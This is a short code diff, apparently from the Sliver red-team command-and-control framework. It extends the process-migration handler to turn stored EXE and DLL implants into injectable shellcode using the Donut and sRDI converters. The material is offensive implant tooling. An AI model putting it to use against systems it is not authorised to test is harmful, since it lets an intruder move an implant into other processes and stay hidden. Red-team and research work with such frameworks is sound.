@@ -30,6 +30,7 @@ import (
 	"path"
 	"strings"
 
+	"github.com/binject/go-donut/donut"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/server/assets"
@@ -67,6 +68,8 @@ func (rpc *Server) Migrate(ctx context.Context, req *clientpb.MigrateReq) (*sliv
 			return nil, err
 		}
 		shellcode, err = ioutil.ReadFile(shellcodePath)
+	} else {
+		rpcLog.Debugf("Got shellcode: len = %d\n", len(shellcode))
 	}
 	reqData, err := proto.Marshal(&sliverpb.InvokeMigrateReq{
 		Request: req.Request,
@@ -202,13 +205,38 @@ func getSliverShellcode(name string) ([]byte, error) {
 	}
 	// get the implant with the same name
 	if conf, ok := configs[name]; ok {
-		if conf.Format == clientpb.ImplantConfig_SHELLCODE {
+		switch conf.Format {
+		case clientpb.ImplantConfig_SHELLCODE:
 			fileData, err := generate.ImplantFileByName(name)
 			if err != nil {
 				return data, err
 			}
 			data = fileData
-		} else {
+		case clientpb.ImplantConfig_EXECUTABLE:
+			// retrieve EXE from db
+			fileData, err := generate.ImplantFileByName(name)
+			rpcLog.Debugf("Found implant. Len: %d\n", len(fileData))
+			if err != nil {
+				return data, err
+			}
+			data, err = generate.DonutShellcodeFromPE(fileData, "x84", false, "", "", "", donut.DONUT_MODULE_EXE)
+			if err != nil {
+				rpcLog.Errorf("DonutShellcodeFromPE error: %v\n", err)
+				return data, err
+			}
+		case clientpb.ImplantConfig_SHARED_LIB:
+			// retrieve DLL from db
+			fileData, err := generate.ImplantFileByName(name)
+			if err != nil {
+				return data, err
+			}
+			data, err = generate.ShellcodeRDIFromBytes(fileData, "RunSliver", "")
+			if err != nil {
+				return data, err
+			}
+		case clientpb.ImplantConfig_SERVICE:
+			fallthrough
+		default:
 			err = fmt.Errorf("no existing shellcode found")
 		}
 	} else {
